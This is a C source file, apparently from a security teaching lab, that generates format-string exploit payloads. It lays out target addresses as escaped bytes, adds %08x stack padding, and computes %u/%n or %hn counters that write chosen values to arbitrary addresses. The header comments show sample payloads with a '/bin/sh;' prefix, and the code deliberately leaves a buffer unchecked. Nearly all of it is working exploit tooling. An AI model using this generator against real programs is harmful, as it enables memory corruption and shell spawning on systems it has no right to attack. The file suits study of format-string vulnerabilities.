/**
	
   Generate a format string to write a value to an arbitrary address.

	(1) Vulnerable format string (when WRITE_STEP_SIZE is 1).
                   The position fmt points to
                   |
      fmt 4B 4B 4B /bin/sh; 4B addr 4B addr+1 4B addr+2 4B addr+3 %08x%08x%08x%08x%08x%u%n%u%n%u%n%u%n
           |  |  | |   |    |   |   |  |      |  |      |  |
          %x %x %x %x  %x	 %u  %n  %u %n     %u %n     %u %n	
	(2)Just before printf reaches %u%n%u%n%u%n%u%n in the format string (when WRITE_STEP_SIZE is 1)
					
			Prefix String: "/bin/sh;"   8 bytes
			4B addr 4B addr+1 4B addr+2 4B addr+3: 		32 bytes
			%08x%08x%08x%08x%08x:			5 * 8 = 40 bytes
			In summary,
			the number of chars written is: strlen(prefix) + 32 + N * 8
			where N is the number of %08x.
	(3) Vulnerable format string (when WRITE_STEP_SIZE is 2).
		"\x41\x41\x41\x41\x80\xb0\x04\x08"
		"\x41\x41\x41\x41\x82\xb0\x04\x08"
		"\x41\x41\x41\x41\x84\xb0\x04\x08"
		"\x41\x41\x41\x41\x86\xb0\x04\x08"
		"%08x%08x%08x%08x%08x"
		"%16625u%hn%65536u%hn%257u%hn%65536u%hn"

	(4) The major difference between (1) and (3): "%hn" VS "%n"
		Write One Word or Half Word.
		In (1), FOUR Word-Writes are needed, but about 1024 (256 * 4) chars are printed.
		In (3), only TWO Harf-Word-Writes, at the cost of more printed chars.

	sheisc@163.com
 */
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "util.h"


// either 1 or 2
#define	WRITE_STEP_SIZE		2

#if WRITE_STEP_SIZE == 2
	#define	COUNTER_WRITE_FMT	"%%%du%%hn"
	#define	WRITE_MASK	0xFFFF
	#define	WRITE_BOUND	0x10000
	#define	WRITES_PER_WORD	((sizeof(unsigned int))/2)
	typedef unsigned short * DATA_PTR;
#else
	#define	COUNTER_WRITE_FMT	"%%%du%%n"
	#define	WRITE_MASK	0xFF
	#define	WRITE_BOUND	0x100
	#define	WRITES_PER_WORD	sizeof(unsigned int)
	typedef unsigned char * DATA_PTR;
#endif

// Low significant bytes
#define LSB(n,m) ((n) & (m))





/**
	(char) 0xFE  -->  \xFE
	@param buf
		The generated chars are stored in buf.
	@param bytes
		Binary bytes to be converted
	@param n
		Number of bytes.
 */
static int gen_printable_chars(char * buf,unsigned char * bytes,int n){
	int i,len;
	len = 0;
	for(i = 0; i < n; i++){
		len = sprintf(buf,BYTE_ESCAPE,bytes[i] & 0xff);
		buf += len;		
	}
	return len * i;
}


/**
	@param written 		
		The number of chars printed before calling this function
	@param vals
		An integer value, interpreted as char[4] or short[2]
	@param cnts
		the result is saved int cnts[],which is used to generate format parameters ,e.g."%123u"

	For instance, the counters in "%37896u%hn%9003u%hn" are {37896,9093}

 */
static int gen_counter(int written, void * vals,int len,int * cnts){
	int i;
	for(i = 0; i < len; i++){
		int cur = ((DATA_PTR)vals)[i];
		if(cur - LSB(written,WRITE_MASK) < 10){
			cnts[i] = cur + WRITE_BOUND - LSB(written,WRITE_MASK);			
		}else{
			cnts[i] = cur - LSB(written,WRITE_MASK);
		}
		written += cnts[i];
	}
	return written;
}
/** 
	Generate printable format string.
	For simplicity, we don't check whether buf is large enough. Another bug:)

	(1) Every unprintable byte is represented by printable chars, e.g. 0xFE is converted to \xFE.
	(2) Need to consider Big-endian / Little-endian in the future.   
	(3) The result is saved int @param buf.    		 
 */
int gen_payload(char * buf, int size, char * prefix, 
		unsigned int * addrs, unsigned int * vals,int av_cnt, int stack_cnt){
	
	int counter[av_cnt][WRITES_PER_WORD];
	int i,n = 0,total = 0,k;
	unsigned int dummy = DUMMY_VALUE;
	unsigned int addr, val;
	int written;
	(void)size;

	// Append prefix
	n = sprintf(buf,"%s",prefix);
	buf += n;
	total += n;
	// Calculate the chars printed when printf() encounters "%u%n%u%n%u%n%u%n"
	written = strlen(prefix)+ 8*WRITES_PER_WORD*av_cnt + stack_cnt * 8;
	/*
		k = 0:
			i = 0:
			"\x41\x41\x41\x41\x80\xb0\x04\x08"
			i = 1:
			"\x41\x41\x41\x41\x82\xb0\x04\x08"
		k = 1:
			i = 0:
			"\x41\x41\x41\x41\x84\xb0\x04\x08"
			i = 1:
			"\x41\x41\x41\x41\x86\xb0\x04\x08"
	*/
	for(k = 0; k < av_cnt; k++){
		addr = addrs[k];
		val = vals[k];
		written = gen_counter(written,&val,WRITES_PER_WORD,counter[k]);
		// dummy, addr, dummy, addr+1, dummy, addr+2, dummy, addr+3
		// dummy, addr, dummy, addr+2
		for(i = 0; i < WRITES_PER_WORD; i++){
			n = gen_printable_chars(buf,(unsigned char * )&dummy,sizeof(dummy));
			buf += n;
			total += n;
			n = gen_printable_chars(buf,(unsigned char * )&addr,sizeof(dummy));
			buf += n;
			total += n;
			addr += WRITE_STEP_SIZE;
		}
	}
	// "%08x%08x%08x%08x%08x"	
	for(i = 0; i < stack_cnt; i++){
		n = sprintf(buf,"%s",STACK_LIFTING_STR);
		buf += n;
		total += n;
	}
	// "%16625u%hn%65536u%hn%257u%hn%65536u%hn"
	for(k = 0; k < av_cnt; k++){
		for(i = 0; i < WRITES_PER_WORD; i++){
			n = sprintf(buf,COUNTER_WRITE_FMT,counter[k][i]);
			buf += n;
			total += n;
		}
	}	

	return total;
}

